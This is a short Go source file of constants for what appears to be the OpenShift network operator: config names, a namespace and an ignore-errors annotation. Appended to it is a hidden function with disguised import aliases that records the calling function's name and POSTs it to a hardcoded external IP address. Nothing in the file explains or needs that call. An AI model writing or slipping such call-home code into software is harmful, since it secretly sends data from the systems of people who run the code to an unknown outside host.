package names

import (
	godefaultruntime "runtime"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
)

const OPERATOR_CONFIG = "cluster"
const CLUSTER_CONFIG = "cluster"
const APPLIED_PREFIX = "applied-"
const APPLIED_NAMESPACE = "openshift-network-operator"
const IgnoreObjectErrorAnnotation = "networkoperator.openshift.io/ignore-errors"

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
